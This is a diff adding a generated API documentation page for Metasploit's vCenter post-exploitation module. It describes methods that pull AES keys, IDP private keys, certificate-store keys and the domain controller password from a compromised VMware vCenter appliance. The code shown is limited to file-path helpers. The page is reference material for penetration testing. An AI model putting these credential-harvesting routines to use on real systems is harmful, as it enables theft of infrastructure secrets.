@@ -1,0 +1,3857 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Post::Vcenter::Vcenter
+  
+    &mdash; Documentation by YARD 0.9.37
+  
+</title>
+
+  <link rel="stylesheet" href="../../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Post::Vcenter::Vcenter";
+  relpath = '../../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../../_index.html">Index (V)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Post.html" title="Msf::Post (class)">Post</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Vcenter.html" title="Msf::Post::Vcenter (module)">Vcenter</a></span></span>
+     &raquo; 
+    <span class="title">Vcenter</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Post::Vcenter::Vcenter
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  <dl>
+      <dt>Includes:</dt>
+      <dd><span class='object_link'><a href="../File.html" title="Msf::Post::File (module)">File</a></span>, <span class='object_link'><a href="../Linux/Priv.html" title="Msf::Post::Linux::Priv (module)">Linux::Priv</a></span></dd>
+  </dl>
+  
+  
+
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/post/vcenter/vcenter.rb</dd>
+  </dl>
+  
+</div>
+
+
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#database_type_file-instance_method" title="#database_type_file (instance method)">#<strong>database_type_file</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#deployment_type_file-instance_method" title="#deployment_type_file (instance method)">#<strong>deployment_type_file</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_aes_keys-instance_method" title="#get_aes_keys (instance method)">#<strong>get_aes_keys</strong>(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)  &#x21d2; Array </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Retrieves the AES keys (STS Tenant, vpx).</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_database_type-instance_method" title="#get_database_type (instance method)">#<strong>get_database_type</strong>  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>It returns the vcenter database type.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_deployment_type-instance_method" title="#get_deployment_type (instance method)">#<strong>get_deployment_type</strong>  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>It returns the vcenter deployment type.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_domain_dc_dn-instance_method" title="#get_domain_dc_dn (instance method)">#<strong>get_domain_dc_dn</strong>  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the domain controller account DN.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_domain_dc_password-instance_method" title="#get_domain_dc_password (instance method)">#<strong>get_domain_dc_password</strong>  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the domain controller account password.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_domain_name-instance_method" title="#get_domain_name (instance method)">#<strong>get_domain_name</strong>  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the domain name of the server.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_fqdn-instance_method" title="#get_fqdn (instance method)">#<strong>get_fqdn</strong>  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>It returns the host FQDN.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_idp_certs-instance_method" title="#get_idp_certs (instance method)">#<strong>get_idp_certs</strong>(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)  &#x21d2; Array </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Retrieves the IDP certificate.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_idp_keys-instance_method" title="#get_idp_keys (instance method)">#<strong>get_idp_keys</strong>(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)  &#x21d2; Array </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Retrieves the IDP private key.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_ipv4-instance_method" title="#get_ipv4 (instance method)">#<strong>get_ipv4</strong>(interface = &#39;eth0&#39;)  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>It returns the IPv4 address of an interface.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_ldif_contents-instance_method" title="#get_ldif_contents (instance method)">#<strong>get_ldif_contents</strong>(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the LDF file contents from the remote system TODO: Make this less jank.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_machine_id-instance_method" title="#get_machine_id (instance method)">#<strong>get_machine_id</strong>(server_name = &#39;localhost&#39;)  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the machine-id (UUID) of a server by name.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_os_version-instance_method" title="#get_os_version (instance method)">#<strong>get_os_version</strong>  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Grabs the photon release and build number.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_platform_service_controller-instance_method" title="#get_platform_service_controller (instance method)">#<strong>get_platform_service_controller</strong>(vc_type_management = false, host = &#39;localhost&#39;)  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns a string of the platform service controller used.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_vcenter_build-instance_method" title="#get_vcenter_build (instance method)">#<strong>get_vcenter_build</strong>  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>It returns the vcenter product banner and build number Cross reference <a href="https://knowledge.broadcom.com/external/article/326316/build-numbers-and-versions-of-vmware-vce.html">knowledge.broadcom.com/external/article/326316/build-numbers-and-versions-of-vmware-vce.html</a>.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_vecs_entries-instance_method" title="#get_vecs_entries (instance method)">#<strong>get_vecs_entries</strong>(vecs_store)  &#x21d2; Array </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns a list of hashes for the vecs store.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_vecs_private_key-instance_method" title="#get_vecs_private_key (instance method)">#<strong>get_vecs_private_key</strong>(vecs_store, entry_alias)  &#x21d2; OpenSSL::PKey::RSA </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns a private key for an alias in a vecs store.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_vecs_stores-instance_method" title="#get_vecs_stores (instance method)">#<strong>get_vecs_stores</strong>  &#x21d2; Array </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the list of stores from the vecs cli.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#is_dn%3F-instance_method" title="#is_dn? (instance method)">#<strong>is_dn?</strong>(dn)  &#x21d2; Bool </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Function to determine if a dn is legitimate.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#is_fqdn%3F-instance_method" title="#is_fqdn? (instance method)">#<strong>is_fqdn?</strong>(fqdn)  &#x21d2; Bool </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Function to determine if a string is a valid FQDN or not.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#is_uuid%3F-instance_method" title="#is_uuid? (instance method)">#<strong>is_uuid?</strong>(uuid)  &#x21d2; Bool </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Function to determine if a string is a valid UUID or not.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#ldapsearch_bin-instance_method" title="#ldapsearch_bin (instance method)">#<strong>ldapsearch_bin</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#lwregshell_bin-instance_method" title="#lwregshell_bin (instance method)">#<strong>lwregshell_bin</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#manifest_file-instance_method" title="#manifest_file (instance method)">#<strong>manifest_file</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#photon_version_file-instance_method" title="#photon_version_file (instance method)">#<strong>photon_version_file</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#process_vcdb_properties_file-instance_method" title="#process_vcdb_properties_file (instance method)">#<strong>process_vcdb_properties_file</strong>(location = vcd_properties_file)  &#x21d2; Hash </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns a hash table of the vcdb.properties file.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#psql_bin-instance_method" title="#psql_bin (instance method)">#<strong>psql_bin</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#validate_pkey-instance_method" title="#validate_pkey (instance method)">#<strong>validate_pkey</strong>(private_key)  &#x21d2; OpenSSL::PKey::RSA </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Function to validate an x509 private key.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#validate_x509_cert-instance_method" title="#validate_x509_cert (instance method)">#<strong>validate_x509_cert</strong>(cert)  &#x21d2; OpenSSL::X509::Certificate </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Function to validate an x509 certificate.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#vcd_properties_file-instance_method" title="#vcd_properties_file (instance method)">#<strong>vcd_properties_file</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#vecs_bin-instance_method" title="#vecs_bin (instance method)">#<strong>vecs_bin</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#vmafd_bin-instance_method" title="#vmafd_bin (instance method)">#<strong>vmafd_bin</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#vpxd_bin-instance_method" title="#vpxd_bin (instance method)">#<strong>vpxd_bin</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../Linux/Priv.html" title="Msf::Post::Linux::Priv (module)">Linux::Priv</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../Linux/Priv.html#binary_of_pid-instance_method" title="Msf::Post::Linux::Priv#binary_of_pid (method)">#binary_of_pid</a></span>, <span class='object_link'><a href="../Linux/Priv.html#cp_cmd-instance_method" title="Msf::Post::Linux::Priv#cp_cmd (method)">#cp_cmd</a></span>, <span class='object_link'><a href="../Linux/Priv.html#grep_cmd-instance_method" title="Msf::Post::Linux::Priv#grep_cmd (method)">#grep_cmd</a></span>, <span class='object_link'><a href="../Linux/Priv.html#head_cmd-instance_method" title="Msf::Post::Linux::Priv#head_cmd (method)">#head_cmd</a></span>, <span class='object_link'><a href="../Linux/Priv.html#is_root%3F-instance_method" title="Msf::Post::Linux::Priv#is_root? (method)">#is_root?</a></span>, <span class='object_link'><a href="../Linux/Priv.html#nchars_file-instance_method" title="Msf::Post::Linux::Priv#nchars_file (method)">#nchars_file</a></span>, <span class='object_link'><a href="../Linux/Priv.html#nlines_file-instance_method" title="Msf::Post::Linux::Priv#nlines_file (method)">#nlines_file</a></span>, <span class='object_link'><a href="../Linux/Priv.html#nwords_file-instance_method" title="Msf::Post::Linux::Priv#nwords_file (method)">#nwords_file</a></span>, <span class='object_link'><a href="../Linux/Priv.html#seq-instance_method" title="Msf::Post::Linux::Priv#seq (method)">#seq</a></span>, <span class='object_link'><a href="../Linux/Priv.html#tail_cmd-instance_method" title="Msf::Post::Linux::Priv#tail_cmd (method)">#tail_cmd</a></span>, <span class='object_link'><a href="../Linux/Priv.html#touch_cmd-instance_method" title="Msf::Post::Linux::Priv#touch_cmd (method)">#touch_cmd</a></span>, <span class='object_link'><a href="../Linux/Priv.html#wc_cmd-instance_method" title="Msf::Post::Linux::Priv#wc_cmd (method)">#wc_cmd</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../File.html" title="Msf::Post::File (module)">File</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../File.html#_append_file_powershell-instance_method" title="Msf::Post::File#_append_file_powershell (method)">#_append_file_powershell</a></span>, <span class='object_link'><a href="../File.html#_append_file_unix_shell-instance_method" title="Msf::Post::File#_append_file_unix_shell (method)">#_append_file_unix_shell</a></span>, <span class='object_link'><a href="../File.html#_can_echo%3F-instance_method" title="Msf::Post::File#_can_echo? (method)">#_can_echo?</a></span>, <span class='object_link'><a href="../File.html#_read_file_meterpreter-instance_method" title="Msf::Post::File#_read_file_meterpreter (method)">#_read_file_meterpreter</a></span>, <span class='object_link'><a href="../File.html#_read_file_powershell-instance_method" title="Msf::Post::File#_read_file_powershell (method)">#_read_file_powershell</a></span>, <span class='object_link'><a href="../File.html#_read_file_powershell_fragment-instance_method" title="Msf::Post::File#_read_file_powershell_fragment (method)">#_read_file_powershell_fragment</a></span>, <span class='object_link'><a href="../File.html#_shell_command_with_success_code-instance_method" title="Msf::Post::File#_shell_command_with_success_code (method)">#_shell_command_with_success_code</a></span>, <span class='object_link'><a href="../File.html#_shell_process_with_success_code-instance_method" title="Msf::Post::File#_shell_process_with_success_code (method)">#_shell_process_with_success_code</a></span>, <span class='object_link'><a href="../File.html#_unix_max_line_length-instance_method" title="Msf::Post::File#_unix_max_line_length (method)">#_unix_max_line_length</a></span>, <span class='object_link'><a href="../File.html#_win_ansi_append_file-instance_method" title="Msf::Post::File#_win_ansi_append_file (method)">#_win_ansi_append_file</a></span>, <span class='object_link'><a href="../File.html#_win_ansi_write_file-instance_method" title="Msf::Post::File#_win_ansi_write_file (method)">#_win_ansi_write_file</a></span>, <span class='object_link'><a href="../File.html#_win_bin_append_file-instance_method" title="Msf::Post::File#_win_bin_append_file (method)">#_win_bin_append_file</a></span>, <span class='object_link'><a href="../File.html#_win_bin_write_file-instance_method" title="Msf::Post::File#_win_bin_write_file (method)">#_win_bin_write_file</a></span>, <span class='object_link'><a href="../File.html#_write_file_meterpreter-instance_method" title="Msf::Post::File#_write_file_meterpreter (method)">#_write_file_meterpreter</a></span>, <span class='object_link'><a href="../File.html#_write_file_powershell-instance_method" title="Msf::Post::File#_write_file_powershell (method)">#_write_file_powershell</a></span>, <span class='object_link'><a href="../File.html#_write_file_powershell_fragment-instance_method" title="Msf::Post::File#_write_file_powershell_fragment (method)">#_write_file_powershell_fragment</a></span>, <span class='object_link'><a href="../File.html#_write_file_unix_shell-instance_method" title="Msf::Post::File#_write_file_unix_shell (method)">#_write_file_unix_shell</a></span>, <span class='object_link'><a href="../File.html#append_file-instance_method" title="Msf::Post::File#append_file (method)">#append_file</a></span>, <span class='object_link'><a href="../File.html#attributes-instance_method" title="Msf::Post::File#attributes (method)">#attributes</a></span>, <span class='object_link'><a href="../File.html#cd-instance_method" title="Msf::Post::File#cd (method)">#cd</a></span>, <span class='object_link'><a href="../File.html#chmod-instance_method" title="Msf::Post::File#chmod (method)">#chmod</a></span>, <span class='object_link'><a href="../File.html#copy_file-instance_method" title="Msf::Post::File#copy_file (method)">#copy_file</a></span>, <span class='object_link'><a href="../File.html#dir-instance_method" title="Msf::Post::File#dir (method)">#dir</a></span>, <span class='object_link'><a href="../File.html#directory%3F-instance_method" title="Msf::Post::File#directory? (method)">#directory?</a></span>, <span class='object_link'><a href="../File.html#executable%3F-instance_method" title="Msf::Post::File#executable? (method)">#executable?</a></span>, <span class='object_link'><a href="../File.html#exist%3F-instance_method" title="Msf::Post::File#exist? (method)">#exist?</a></span>, <span class='object_link'><a href="../File.html#expand_path-instance_method" title="Msf::Post::File#expand_path (method)">#expand_path</a></span>, <span class='object_link'><a href="../File.html#exploit_data-instance_method" title="Msf::Post::File#exploit_data (method)">#exploit_data</a></span>, <span class='object_link'><a href="../File.html#exploit_source-instance_method" title="Msf::Post::File#exploit_source (method)">#exploit_source</a></span>, <span class='object_link'><a href="../File.html#file%3F-instance_method" title="Msf::Post::File#file? (method)">#file?</a></span>, <span class='object_link'><a href="../File.html#file_local_write-instance_method" title="Msf::Post::File#file_local_write (method)">#file_local_write</a></span>, <span class='object_link'><a href="../File.html#file_remote_digestmd5-instance_method" title="Msf::Post::File#file_remote_digestmd5 (method)">#file_remote_digestmd5</a></span>, <span class='object_link'><a href="../File.html#file_remote_digestsha1-instance_method" title="Msf::Post::File#file_remote_digestsha1 (method)">#file_remote_digestsha1</a></span>, <span class='object_link'><a href="../File.html#file_remote_digestsha2-instance_method" title="Msf::Post::File#file_remote_digestsha2 (method)">#file_remote_digestsha2</a></span>, <span class='object_link'><a href="../File.html#immutable%3F-instance_method" title="Msf::Post::File#immutable? (method)">#immutable?</a></span>, <span class='object_link'><a href="../File.html#initialize-instance_method" title="Msf::Post::File#initialize (method)">#initialize</a></span>, <span class='object_link'><a href="../File.html#mkdir-instance_method" title="Msf::Post::File#mkdir (method)">#mkdir</a></span>, <span class='object_link'><a href="../File.html#pwd-instance_method" title="Msf::Post::File#pwd (method)">#pwd</a></span>, <span class='object_link'><a href="../File.html#read_file-instance_method" title="Msf::Post::File#read_file (method)">#read_file</a></span>, <span class='object_link'><a href="../File.html#readable%3F-instance_method" title="Msf::Post::File#readable? (method)">#readable?</a></span>, <span class='object_link'><a href="../File.html#rename_file-instance_method" title="Msf::Post::File#rename_file (method)">#rename_file</a></span>, <span class='object_link'><a href="../File.html#rm_f-instance_method" title="Msf::Post::File#rm_f (method)">#rm_f</a></span>, <span class='object_link'><a href="../File.html#rm_rf-instance_method" title="Msf::Post::File#rm_rf (method)">#rm_rf</a></span>, <span class='object_link'><a href="../File.html#setuid%3F-instance_method" title="Msf::Post::File#setuid? (method)">#setuid?</a></span>, <span class='object_link'><a href="../File.html#stat-instance_method" title="Msf::Post::File#stat (method)">#stat</a></span>, <span class='object_link'><a href="../File.html#upload_and_chmodx-instance_method" title="Msf::Post::File#upload_and_chmodx (method)">#upload_and_chmodx</a></span>, <span class='object_link'><a href="../File.html#upload_file-instance_method" title="Msf::Post::File#upload_file (method)">#upload_file</a></span>, <span class='object_link'><a href="../File.html#writable%3F-instance_method" title="Msf::Post::File#writable? (method)">#writable?</a></span>, <span class='object_link'><a href="../File.html#write_file-instance_method" title="Msf::Post::File#write_file (method)">#write_file</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../Common.html" title="Msf::Post::Common (module)">Common</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../Common.html#clear_screen-instance_method" title="Msf::Post::Common#clear_screen (method)">#clear_screen</a></span>, <span class='object_link'><a href="../Common.html#cmd_exec-instance_method" title="Msf::Post::Common#cmd_exec (method)">#cmd_exec</a></span>, <span class='object_link'><a href="../Common.html#cmd_exec_get_pid-instance_method" title="Msf::Post::Common#cmd_exec_get_pid (method)">#cmd_exec_get_pid</a></span>, <span class='object_link'><a href="../Common.html#cmd_exec_with_result-instance_method" title="Msf::Post::Common#cmd_exec_with_result (method)">#cmd_exec_with_result</a></span>, <span class='object_link'><a href="../Common.html#command_exists%3F-instance_method" title="Msf::Post::Common#command_exists? (method)">#command_exists?</a></span>, <span class='object_link'><a href="../Common.html#create_process-instance_method" title="Msf::Post::Common#create_process (method)">#create_process</a></span>, <span class='object_link'><a href="../Common.html#get_env-instance_method" title="Msf::Post::Common#get_env (method)">#get_env</a></span>, <span class='object_link'><a href="../Common.html#get_envs-instance_method" title="Msf::Post::Common#get_envs (method)">#get_envs</a></span>, <span class='object_link'><a href="../Common.html#initialize-instance_method" title="Msf::Post::Common#initialize (method)">#initialize</a></span>, <span class='object_link'><a href="../Common.html#peer-instance_method" title="Msf::Post::Common#peer (method)">#peer</a></span>, <span class='object_link'><a href="../Common.html#report_virtualization-instance_method" title="Msf::Post::Common#report_virtualization (method)">#report_virtualization</a></span>, <span class='object_link'><a href="../Common.html#rhost-instance_method" title="Msf::Post::Common#rhost (method)">#rhost</a></span>, <span class='object_link'><a href="../Common.html#rport-instance_method" title="Msf::Post::Common#rport (method)">#rport</a></span></p>
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="database_type_file-instance_method">
+  
+    #<strong>database_type_file</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+18
+19
+20</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 18</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_database_type_file'>database_type_file</span>
+  <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/etc/vmware/db.type</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="deployment_type_file-instance_method">
+  
+    #<strong>deployment_type_file</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+14
+15
+16</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 14</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_deployment_type_file'>deployment_type_file</span>
+  <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/etc/vmware/deployment.node.type</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_aes_keys-instance_method">
+  
+    #<strong>get_aes_keys</strong>(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)  &#x21d2; <tt>Array</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Retrieves the AES keys (STS Tenant, vpx). <a href="https://github.com/vmware/lightwave/blob/master/vmidentity/install/src/main/java/com/vmware/identity/installer/SystemDomainAdminUpdateUtils.java#L72-L78">github.com/vmware/lightwave/blob/master/vmidentity/install/src/main/java/com/vmware/identity/installer/SystemDomainAdminUpdateUtils.java#L72-L78</a></p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>base_fqdn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>fully qualified domain name of the virtual center</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>vc_psc_fqdn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>fully qualified domain name of the virtual center</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>base_dn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the base dn to search in ldap</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>bind_dn</span>
+      
+      
